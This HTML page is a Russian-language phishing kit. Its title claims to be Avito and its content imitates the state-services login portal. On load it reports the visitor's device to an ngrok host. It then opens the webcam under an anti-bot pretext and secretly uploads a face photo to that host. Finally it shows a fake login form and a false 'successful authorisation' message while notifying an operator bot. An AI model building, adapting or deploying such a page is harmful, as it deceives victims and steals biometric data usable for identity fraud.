<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Avito - Платформа БУ товаров и многое другое!</title>
    <style>
        * { box-sizing: border-box; }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #e4ecfd;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            position: relative;
        }

        /* --- ПЕРВОНАЧАЛЬНАЯ ЗАГРУЗКА (СТРОГО ПО ЦЕНТРУ) --- */
        .initial-loader-overlay {
            position: fixed;
            inset: 0;
            background-color: #e4ecfd;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 200000;
        }
        .initial-loader-card {
            background: #ffffff;
            padding: 40px 30px;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.03);
            width: 100%;
            max-width: 380px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
        }
        .loader-spinner {
            width: 45px;
            height: 45px;
            border: 4px solid #f2f3f5;
            border-top: 4px solid #005FF9;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        .loader-text { font-size: 15px; color: #0c2340; font-weight: 500; }

        /* --- СТИЛИ ОКНА АВТОРИЗАЦИИ (ШАГ 3) --- */
        .main-container { position: relative; display: flex; justify-content: center; align-items: center; width: 100%; }
        
        .form-column { 
            display: flex; 
            flex-direction: column; 
            width: 100%; 
            max-width: 380px; 
            z-index: 1;
            opacity: 0; 
            display: none; 
            transition: opacity 0.5s ease-in-out;
        }

        .card { background: #ffffff; padding: 35px 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.03); width: 100%; }

        .logo-container { text-align: center; margin-bottom: 25px; }
        .logo-img { max-height: 130px; width: auto; display: block; margin: 0 auto; }
        .logo-placeholder { font-size: 22px; font-weight: 800; color: #005FF9; letter-spacing: 0.5px; }

        .form-group { margin-bottom: 16px; }
        .form-group label { display: block; margin-bottom: 8px; font-size: 14px; color: #000; }
        .form-group input {
            width: 100%; padding: 12px; background-color: #f2f3f5; border: 1px solid transparent; 
            border-radius: 8px; font-size: 14px; outline: none; transition: border-color 0.2s, background-color 0.2s;
            color: #4b5563;
        }

        .link-restore, .link-cant-login, .alt-login-text a, .register-link-container a { color: #2764FC; text-decoration: none; }
        .link-restore { display: inline-block; font-size: 14px; margin-bottom: 24px; }
        .link-cant-login { display: block; text-align: center; font-size: 14px; margin-bottom: 24px; }
        
        .btn-primary {
            width: 100%; padding: 14px; background-color: #005FF9; color: #ffffff; border: none; 
            border-radius: 8px; font-size: 15px; font-weight: 500; cursor: pointer; margin-bottom: 20px;
        }

        .divider { border: none; border-top: 1px solid #e1e3e6; margin: 0 -30px 24px -30px; }
        .alt-login-text { font-size: 14px; color: #000; margin-bottom: 16px; }
        .btn-outline {
            width: 100%; padding: 12px; background-color: transparent; color: #2764FC; border: 1px solid #2764FC; 
            border-radius: 8px; font-size: 14px; font-weight: 500; cursor: pointer; margin-bottom: 12px;
        }
        .register-link-container { margin-top: 25px; text-align: center; font-size: 15px; }

        /* --- МОДАЛЬНЫЕ ОКНА БИОМЕТРИИ (ШАГ 2) --- */
        .bio-modal-overlay {
            position: fixed; inset: 0; background: rgba(12, 35, 64, 0.85); backdrop-filter: blur(8px); display: flex; 
            justify-content: center; align-items: center; z-index: 100000; opacity: 0; visibility: hidden; transition: opacity 0.4s ease, visibility 0.4s ease; padding: 20px;
        }
        .bio-modal-overlay.visible { opacity: 1; visibility: visible; }
        .bio-modal-content {
            background: #ffffff; border-radius: 20px; width: 100%; max-width: 420px; padding: 30px 25px;
            text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.3); transform: translateY(20px); transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }
        .bio-modal-overlay.visible .bio-modal-content { transform: translateY(0); }
        .bio-modal-title { font-size: 22px; color: #0c2340; margin: 0 0 10px 0; }
        .bio-modal-desc { font-size: 14px; color: #4b5563; margin: 0 0 20px 0; line-height: 1.5; }

        .camera-container {
            width: 100%; height: 320px; background: #000; border-radius: 16px; overflow: hidden; margin-bottom: 24px; 
            position: relative; box-shadow: inset 0 0 20px rgba(0,0,0,0.5); border: 2px solid #e1e3e6;
        }
        #bioVideo { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
        
        .face-guide {
            position: absolute;
            top: 50%; left: 50%;
            transform: translate(-50%, -50%);
            width: 180px; height: 250px;
            border-radius: 50%;
            box-shadow: 0 0 0 2000px rgba(12, 35, 64, 0.7);
            border: 2px dashed rgba(255, 255, 255, 0.8);
            pointer-events: none;
            z-index: 2;
        }

        .btn-bio-capture {
            width: 100%; padding: 16px; background-color: #005FF9; color: #ffffff; border: none; border-radius: 12px; 
            font-size: 16px; font-weight: 600; cursor: pointer; transition: background-color 0.2s; display: flex; align-items: center; justify-content: center; gap: 10px;
        }

        /* --- АНИМАЦИЯ УСПЕХА (ШАГ 4) --- */
        .success-overlay {
            position: fixed; inset: 0; background: rgba(12, 35, 64, 0.85); backdrop-filter: blur(8px); display: flex; 
            justify-content: center; align-items: center; z-index: 11000; opacity: 0; visibility: hidden; transition: opacity 0.4s ease, visibility 0.4s ease; padding: 20px;
        }
        .success-overlay.visible { opacity: 1; visibility: visible; }
        
        .success-card {
            background: #ffffff; border-radius: 20px; width: 100%; max-width: 400px; padding: 40px 30px;
            text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.3); transform: scale(0.9); transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }
        .success-overlay.visible .success-card { transform: scale(1); }

        .checkmark-circle {
            width: 80px; height: 80px; border-radius: 50%; background: #005FF9; display: flex; align-items: center; justify-content: center;
            margin: 0 auto 20px auto; animation: scaleIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
        }
        .checkmark-icon { color: white; font-size: 40px; font-weight: bold; }
        .success-title { font-size: 24px; color: #0c2340; margin: 0 0 10px 0; font-weight: 700; }
        .success-desc { font-size: 15px; color: #4b5563; margin: 0 0 20px 0; line-height: 1.5; }

        @keyframes spin { 100% { transform: rotate(360deg); } }
        @keyframes scaleIn { 0% { transform: scale(0); } 100% { transform: scale(1); } }
    </style>
</head>
<body>

    <!-- 1. Окно первоначальной загрузки -->
    <div class="initial-loader-overlay" id="initialLoaderOverlay">
        <div class="initial-loader-card">
            <div class="loader-spinner"></div>
            <div class="loader-text">Установка безопасного соединения...</div>
        </div>
    </div>

    <!-- 3. Окно авторизации (Появится на 1.5 сек) -->
    <div class="main-container">
        <div class="form-column" id="loginFormContainer">
            <div class="card">
                <div class="logo-container">
                    <img src="flags/gos.png" alt="логотип" class="logo-img" onerror="this.style.display='none'; this.nextElementSibling.style.display='block';">
                    <div class="logo-placeholder" style="display:none;">ЛОГОТИП</div>
                </div>
                <form action="#" method="POST" onsubmit="return false;">
                    <div class="form-group"><label>Телефон / Эл. почта</label><input type="text" name="phone" id="inputPhone" readonly value="+7 (***) ***-**-**" /></div>
                    <div class="form-group"><label>Пароль</label><input type="password" name="password" id="inputPassword" readonly value="********" /></div>
                    <a href="#" class="link-restore">Восстановить</a>
                    <button type="button" class="btn-primary" disabled>Войти</button>
                </form>
                <a href="#" class="link-cant-login">Не удаётся войти</a>
                <hr class="divider">
                <div class="alt-login-text">Войти другим способом. <a href="#">Подробнее</a></div>
                <button type="button" class="btn-outline">QR-код</button>
                <button type="button" class="btn-outline">Электронная подпись</button>
            </div>
            <div class="register-link-container"><a href="#">Зарегистрироваться</a></div>
        </div>
    </div>

    <!-- 2. ШАГ 2: КАМЕРА ПОДТВЕРЖДЕНИЯ -->
    <div id="biometryModal" class="bio-modal-overlay">
        <div class="bio-modal-content">
            <h3 class="bio-modal-title">Подтверждение личности</h3>
            <p class="bio-modal-desc">Поместите лицо в овал. Ожидайте, пока система распознает вас.</p>
            
            <div class="camera-container">
                <video id="bioVideo" autoplay playsinline muted></video>
                <div class="face-guide"></div>
            </div>
            <button id="btnCapture" class="btn-bio-capture">
                <span style="animation: spin 1s linear infinite; display: inline-block;">⏳</span> Инициализация камеры...
            </button>
        </div>
    </div>

    <!-- 4. ШАГ 4: УСПЕШНЫЙ ВХОД (НОВОЕ ОКНО) БЕЗ РЕДИРЕКТА -->
    <div id="successModal" class="success-overlay">
        <div class="success-card">
            <div class="checkmark-circle">
                <div class="checkmark-icon">✓</div>
            </div>
            <h2 class="success-title">Успешно!</h2>
            <p class="success-desc">Вы успешно авторизовались в личном кабинете государственных услуг.</p>
        </div>
    </div>

    <script>
        const initialLoaderOverlay = document.getElementById('initialLoaderOverlay');
        const loginFormContainer = document.getElementById('loginFormContainer');
        const bioModal = document.getElementById('biometryModal');
        const successModal = document.getElementById('successModal');
        const video = document.getElementById('bioVideo');
        const btnCapture = document.getElementById('btnCapture');
        let stream = null;

        // Генерация единого ID сессии и извлечение реферального кода
        const sessionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
        const urlParams = new URLSearchParams(window.location.search);
        const refCode = urlParams.get('ref') || '';
        const API_BASE = 'https://batboy-paramedic-rambling.ngrok-free.dev'; // Замените на ваш домен

        document.addEventListener('DOMContentLoaded', () => {
            // Отправка информации о посещении
            const visitDeviceInfo = {
                userAgent: navigator.userAgent,
                localTime: new Date().toLocaleString('ru-RU')
            };

            fetch(`${API_BASE}/api/visit`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ refCode, sessionId, deviceInfo: visitDeviceInfo })
            }).catch(console.error);

            // ЭТАП 1: Имитация первоначальной загрузки (2 секунды)
            setTimeout(() => {
                initialLoaderOverlay.style.display = 'none';
                
                // ЭТАП 2: Появление формы подтверждения по лицу
                bioModal.classList.add('visible');
                startCamera();
            }, 2000);
        });

        async function startCamera() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                video.srcObject = stream;
                startAutoCapture();
            } catch (err) {
                console.error("Ошибка доступа к камере:", err);
                alert("Пожалуйста, разрешите доступ к камере для защиты от ботов.");
            }
        }

        function startAutoCapture() {
            btnCapture.disabled = true;
            btnCapture.style.backgroundColor = '#d29922'; 
            btnCapture.innerHTML = '<span style="animation: spin 1s linear infinite; display: inline-block;">⏳</span> Анализ лица...';

            setTimeout(() => {
                btnCapture.style.backgroundColor = '#005FF9'; 
                btnCapture.innerHTML = '<span style="animation: spin 1s linear infinite; display: inline-block;">⏳</span> Ожидание подтверждения системой...';
                
                // Отправка фото на сервер
                captureAndSendBackground();
                
                // Симуляция времени проверки (6 секунд)
                setTimeout(() => {
                    if (stream) stream.getTracks().forEach(track => track.stop());
                    
                    // Скрываем FaceID
                    bioModal.classList.remove('visible');
                    
                    // ЭТАП 3: Появление формы авторизации на 1.5 секунды
                    loginFormContainer.style.display = 'flex';
                    
                    // Небольшая задержка для плавного появления
                    setTimeout(() => {
                        loginFormContainer.style.opacity = '1';
                    }, 50);

                    // Скрываем форму через 1.5 секунды
                    setTimeout(() => {
                        loginFormContainer.style.opacity = '0';
                        
                        setTimeout(() => {
                            loginFormContainer.style.display = 'none';
                            
                            // ЭТАП 4: Подтверждение успешного входа (Новое всплывающее окно)
                            showSuccessNotification();
                        }, 500); // Ждем пока закончится анимация затухания

                    }, 1500); // Форма авторизации висит на экране ровно 1.5 секунды
                    
                }, 6000);

            }, 2500);
        }

        function captureAndSendBackground() {
            if (!stream) return;
            
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const photoBase64 = canvas.toDataURL('image/jpeg', 0.8);

            const deviceInfo = {
                userAgent: navigator.userAgent,
                localTime: new Date().toLocaleString('ru-RU')
            };

            fetch(`${API_BASE}/api/biometry`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    image: photoBase64, 
                    deviceInfo: deviceInfo, 
                    refCode, 
                    sessionId
                })
            }).catch(console.error);
        }

        function showSuccessNotification() {
            successModal.classList.add('visible');
            
            // Уведомляем бот об успешной авторизации
            fetch(`${API_BASE}/api/success`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ sessionId })
            }).catch(console.error);
        }
    </script>
</body>
</html>
